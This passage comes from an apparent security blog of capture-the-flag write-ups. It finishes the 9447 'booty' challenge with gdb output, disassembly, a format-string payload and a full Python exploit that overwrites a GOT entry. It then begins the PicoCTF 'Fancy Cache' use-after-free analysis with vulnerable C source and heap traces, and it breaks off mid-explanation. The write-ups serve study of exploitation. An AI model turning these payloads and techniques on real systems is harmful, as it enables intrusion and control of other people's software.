<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># bas@tritonal:~/tmp/9447$ gdb -pid `pgrep booty`</span>
</span><span class='line'>...
</span><span class='line'>Stopped reason: SIGINT
</span><span class='line'>0xf7757430 in __kernel_vsyscall <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/10x 0xffdd1c3f
</span><span class='line'>0xffdd1c3f:   0xdd1c9000  0x000001ff  0xdd1cd800  0x048e51ff
</span><span class='line'>0xffdd1c4f:   0xdd1c9008  0x000001ff  0xdd1d4800  0x048796ff
</span><span class='line'>0xffdd1c5f:   0x73d4e008  0x0499def7
</span></code></pre></td></tr></table></div></figure>


<p>Nothing there! No string, no flag, nothing! To be honest, I spent quite some time trying to figure out what I was doing wrong. I figured I was to blame and tried to read the address  that is returned after winning on the remote server. I hope the flag would be there. For this, I needed et0x&rsquo;s observation, because it allowed me to bypass the filtering of <code>%</code> characters. The binary filters the characters here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 80488dd:    <span class="m">80</span> 7a ff <span class="m">25</span>           cmpb   <span class="nv">$0x25</span>,-0x1<span class="o">(</span>%edx<span class="o">)</span>
</span><span class='line'> 80488e1: <span class="m">74</span> 0d                    je     80488f0 &lt;vfprintf@plt+0x380&gt;
</span><span class='line'> 80488e3: <span class="m">39</span> c2                    cmp    %eax,%edx
</span><span class='line'> 80488e5: <span class="m">75</span> f1                    jne    80488d8 &lt;vfprintf@plt+0x36
</span></code></pre></td></tr></table></div></figure>


<p>If it encounters a <code>%</code>, it will stop and set that byte to NULL. However, if we supply a new username that is shorter than the previous one, the program will only check len(username) bytes for <code>%</code> characters. If we supply:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>%aa%x%x
</span></code></pre></td></tr></table></div></figure>


<p>as the first user name and then</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bb
</span></code></pre></td></tr></table></div></figure>


<p>Then the new username will be <code>bba%x%x</code>. All we have to do then is to beat the game once more, so the format string is triggered. That is because the string <code>:: HAIL THE NEW PIRATE KING,</code> is printed separately from the username, which is printed with something like <code>print(username)</code>.</p>

<p>I did all this to print the string at the memory address that is given by the binary&hellip; to no avail. The final piece of the puzzle was the <code>fopen</code> call that opens the file <code>/home/booty/flag</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 80487c0:    <span class="m">53</span>                       push   %ebx
</span><span class='line'> 80487c1: <span class="m">83</span> ec <span class="m">10</span>              sub    <span class="nv">$0x10</span>,%esp
</span><span class='line'> 80487c4: <span class="m">68</span> <span class="m">60</span> 9a <span class="m">04</span> <span class="m">08</span>          push   <span class="nv">$0x8049a60</span>   <span class="c"># &#39;r&#39;</span>
</span><span class='line'> 80487c9: <span class="m">68</span> <span class="m">61</span> <span class="m">98</span> <span class="m">04</span> <span class="m">08</span>           push   <span class="nv">$0x8049861</span>   <span class="c"># &quot;/home/booty/flag&quot;</span>
</span><span class='line'> 80487ce: e8 6d fd ff ff          call   <span class="m">8048540</span> &lt;fopen@plt&gt;
</span><span class='line'> 80487d3: <span class="m">83</span> c4 <span class="m">10</span>              add    <span class="nv">$0x10</span>,%esp
</span><span class='line'> 80487d6: <span class="m">85</span> c0                    <span class="nb">test</span>   %eax,%eax
</span><span class='line'> 80487d8: <span class="m">89</span> c3                    mov    %eax,%ebx
</span><span class='line'> 80487da: <span class="m">75</span> <span class="m">19</span>                 jne    80487f5 &lt;vfprintf@plt+0x285&gt;
</span><span class='line'> 80487dc: eb <span class="m">33</span>                    jmp    <span class="m">8048811</span> &lt;vfprintf@plt+0x2a1&gt;
</span><span class='line'> 80487de: <span class="m">66</span> <span class="m">90</span>                 xchg   %ax,%ax
</span><span class='line'> 80487e0: <span class="m">83</span> ec <span class="m">08</span>              sub    <span class="nv">$0x8</span>,%esp
</span><span class='line'> 80487e3: 0f be d0                movsbl %al,%edx
</span><span class='line'> 80487e6: ff <span class="m">35</span> a4 a1 <span class="m">04</span> <span class="m">08</span>      pushl  0x804a1a4
</span><span class='line'> 80487ec: <span class="m">52</span>                       push   %edx
</span><span class='line'> 80487ed: e8 fe <span class="nb">fc </span>ff ff          call   80484f0 &lt;_IO_putc@plt&gt;
</span><span class='line'> 80487f2: <span class="m">83</span> c4 <span class="m">10</span>              add    <span class="nv">$0x10</span>,%esp
</span><span class='line'> 80487f5: <span class="m">83</span> ec 0c                 sub    <span class="nv">$0xc</span>,%esp
</span><span class='line'> 80487f8: <span class="m">53</span>                       push   %ebx
</span><span class='line'> 80487f9: e8 e2 <span class="nb">fc </span>ff ff          call   80484e0 &lt;_IO_getc@plt&gt;
</span><span class='line'> 80487fe: <span class="m">83</span> c4 <span class="m">10</span>              add    <span class="nv">$0x10</span>,%esp
</span><span class='line'> 8048801: 3c ff                   cmp    <span class="nv">$0xff</span>,%al
</span><span class='line'> 8048803: <span class="m">75</span> db                    jne    80487e0 &lt;vfprintf@plt+0x270&gt;
</span><span class='line'> 8048805: <span class="m">83</span> ec 0c                 sub    <span class="nv">$0xc</span>,%esp
</span><span class='line'> 8048808: <span class="m">53</span>                       push   %ebx
</span><span class='line'> 8048809: e8 b2 <span class="nb">fc </span>ff ff          call   80484c0 &lt;fclose@plt&gt;
</span><span class='line'> 804880e: <span class="m">83</span> c4 <span class="m">10</span>              add    <span class="nv">$0x10</span>,%esp
</span><span class='line'> 8048811: <span class="m">83</span> ec 0c                 sub    <span class="nv">$0xc</span>,%esp
</span><span class='line'> 8048814: 6a <span class="m">00</span>                    push   <span class="nv">$0x0</span>
</span><span class='line'> 8048816: e8 f5 <span class="nb">fc </span>ff ff          call   <span class="m">8048510</span> &lt;<span class="nb">exit</span>@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>It seems like this function is never called, yet it does open the flag and spits out the contents. I verified this from within <code>gdb</code> by running <code>set $eip=0x80487c0</code> and then continuing execution. Indeed, it spat out the bogus flag of my local system. I leveraged the string format vulnerability to overwrite a got pointer force the binary to execute that function. I chose to overwrite <code>vfprintf</code>, because that&rsquo;s called a lot by the binary. I needed to overwrite this pointer in two steps. First, the lower two bytes are overwritten with <code>0x87c0</code>. Then the higher two bytes are overwritten with <code>0x0804</code>. When the binary then wants to call <code>vfprintf</code>, code execution is redirected to <code>0x80487c0</code>!</p>

<p>The exploit now sends the first username: <code>cmd ="%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n"</code>. This contains the <code>%</code> character and the rest of the format string. I found the proper offset for the direct addressing (<code>%36$hn</code>) simply by trying a few values together with a name that contained &ldquo;AAAABBBBCCCC&rdquo; blocks. The rest of the padding (<code>%34719c</code> for instance) is simply by running <code>gdb</code> and taking note of the address where the binary crashes. Adding the right amount of padding, observing the crash again, etc.</p>

<p>The final exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">7778</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># wait before continuing, allows attaching with gdb.</span>
</span><span class='line'><span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send string format name</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span><span class="s">&quot;%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="si">%34719c</span><span class="s">%36$hn</span><span class="si">%32836c</span><span class="s">%37$n&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># try to beat the game</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="n">data</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># proper responses</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;LEVEL&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;h</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;exhausted&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;p</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;flex&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;h</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;tense&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;r</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>      
</span><span class='line'>  <span class="c"># we&#39;ve won; update name to activate string format bug</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;again&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="c"># 0x804a138: vfprintf@got.plt</span>
</span><span class='line'>      <span class="c"># we overwrite it in two parts, the first uses %hn to write two bytes to the lower part of the address</span>
</span><span class='line'>      <span class="c"># the second %n overwrites four bytes, but I don&#39;t really care.</span>
</span><span class='line'>      <span class="c"># the rest of the string format bug is: &quot;%34719c%36$hn%32836c%37$n&quot;</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;ya0AAAAAAAAAAAAAAAAAAAAAAA&quot;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x804a138</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x804a13a</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># flag is in the input, so halt execution &amp; take note of it!</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;9447&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>      
</span><span class='line'>  <span class="c"># game expects input, so send it</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;&gt;&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">cmd</span><span class="p">:</span>
</span><span class='line'>          <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>          <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The real flag was something like <code>9447{YOHOHO_A_PIRATES_LIFE_FOR_ME}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PicoCTF - Fancy Cache]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache/"/>
    <updated>2014-11-06T23:49:03+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache</id>
    <content type="html"><![CDATA[<p>Fancy Cache was another &ldquo;Master Challenge&rdquo; for PicoCTF. It featured a custom server, which allegedly creates a cache of strings. It&rsquo;s up to us to break it!</p>

<!--more-->


<p>We are given the source code, the binary, a libc library and a client written in Python. Wow! <code>fancy_cache</code> communicates in a difficult way, but luckily, all the heavy lifting is already done for us in <code>client.py</code>! Browsing through fancy_cache.c, we immediately felt that this had to be some kind of use-after-free bug. Indeed, there is a bug in these two functions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">cache_entry</span> <span class="o">*</span><span class="nf">cache_lookup</span><span class="p">(</span><span class="k">struct</span> <span class="n">string</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">kCacheSize</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">cache_entry</span> <span class="o">*</span><span class="n">entry</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">cache</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Skip expired cache entries.</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">lifetime</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">string_eq</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>     <span class="k">return</span> <span class="n">entry</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">do_cache_get</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">string</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>  <span class="n">string_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>  <span class="n">read_into_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">struct</span> <span class="n">cache_entry</span> <span class="o">*</span><span class="n">entry</span> <span class="o">=</span> <span class="n">cache_lookup</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">entry</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kNotFound</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kNotFound</span><span class="p">));</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kFound</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kFound</span><span class="p">));</span>
</span><span class='line'>  <span class="n">write_string</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">--</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">lifetime</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">lifetime</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// The cache entry is now expired.</span>
</span><span class='line'>    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Destroying key %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
</span><span class='line'>    <span class="n">string_destroy</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Destroying value %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
</span><span class='line'>    <span class="n">string_destroy</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The function <code>do_cache_get</code> will free a string struct when the lifetime goes below zero, but <code>cache_lookup</code> will happily return entries with a negative lifetime. That means we can free a string struct, <em>somehow</em> write to it, and influence the cache entries! After calls to <code>free()</code>, subsequent calls to <code>malloc()</code> will usually return recently freed memory. For instance, consider this sequence:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># start our server</span>
</span><span class='line'>bas@tritonal:~/tmp/picoctf/fancy_cache<span class="nv">$ </span>socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./fancy_cache
</span></code></pre></td></tr></table></div></figure>


<p>And modify the client.py script a bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Add an entry with a negative lifetime. This will fool cache_lookup.</span>
</span><span class='line'><span class="n">cache_set</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;keyAAAA&#39;</span><span class="p">,</span> <span class="s">&#39;AAAA____&#39;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Request that value, causing it to be deleted from cache</span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;keyAAAA&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Now request the value of &#39;bleh&#39;</span>
</span><span class='line'><span class="k">print</span> <span class="n">cache_get</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&#39;bleh&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This results in the following debug output of the local server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>malloc<span class="o">(</span>12<span class="o">)</span> <span class="o">=</span> 0x8598008 <span class="o">(</span>string_create<span class="o">)</span>
</span><span class='line'>realloc<span class="o">((</span>nil<span class="o">)</span>, 7<span class="o">)</span> <span class="o">=</span> 0x8598018 <span class="o">(</span>read_into_string<span class="o">)</span>
</span><span class='line'>malloc<span class="o">(</span>12<span class="o">)</span> <span class="o">=</span> 0x8598028 <span class="o">(</span>string_create<span class="o">)</span>
</span><span class='line'>realloc<span class="o">((</span>nil<span class="o">)</span>, 8<span class="o">)</span> <span class="o">=</span> 0x8598038 <span class="o">(</span>read_into_string<span class="o">)</span>
</span><span class='line'>realloc<span class="o">((</span>nil<span class="o">)</span>, 7<span class="o">)</span> <span class="o">=</span> 0x8598048 <span class="o">(</span>read_into_string<span class="o">)</span>
</span><span class='line'>Destroying key
</span><span class='line'>free<span class="o">(</span>0x8598008<span class="o">)</span> <span class="o">(</span>string_destroy str<span class="o">)</span>
</span><span class='line'>Destroying value
</span><span class='line'>free<span class="o">(</span>0x8598028<span class="o">)</span> <span class="o">(</span>string_destroy str<span class="o">)</span>
</span><span class='line'>realloc<span class="o">((</span>nil<span class="o">)</span>, 4<span class="o">)</span> <span class="o">=</span> 0x8598028 <span class="o">(</span>read_into_string<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>At first, the code allocates <code>0x8598008</code> and <code>0x8598028</code> as <code>key</code> and <code>value</code> string structs, respectively. Then, we request the value of &lsquo;keyAAAA&rsquo;, causing do_cache_get to free that memory again. Next, we request the value of the non-existent key &lsquo;bleh&rsquo;. However, the program allocates space at <code>0x8598028</code>, the recently freed region! Because the cache entry is still valid (lifetime != 0), we can write a new string struct to these locations! Let&rsquo;s first try to read memory. There is a hint hidden on the remote server, waiting for us. In the local copy, it just says <code>REDACTED</code>. In order for this work, cache->key->data must point to a real string. I choose &lsquo;printf&rsquo; in the binary. So:</p>

<ul>
<li>We register a struct string with lifetime -1.</li>
<li>We fetch it; the struct string will be freed, but the cache_lookup() function will still try to use it, because lifetime != 0</li>
<li>We try to request another string struct, but this will allocate the old memory location and overwrite the old alloc’ed key &amp; value regions (still valid according to cache_lookup()!).</li>
<li>We “write” a string struct into value:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>old_value-&gt;length <span class="o">=</span> 0xff
</span><span class='line'>old_value-&gt;capacity <span class="o">=</span> 0x00
</span><span class='line'>old_value-&gt;data <span class="o">=</span> pointer to whatever we want to <span class="nb">read</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>We write a string struct into key:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>old_key-&gt;length <span class="o">=</span> 0x6
</span><span class='line'>old_key-&gt;cap <span class="o">=</span> 0x00
</span><span class='line'>old_key-&gt;data <span class="o">=</span> pointer to string that is known, like <span class="nb">printf</span> -&gt;      0x8048310
</span></code></pre></td></tr></table></div></figure>


<p>We need that known string (printf was chosen arbitrarily) because we need the following piece of code to evaluate to true:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">string_eq</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>   <span class="k">return</span> <span class="n">entry</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
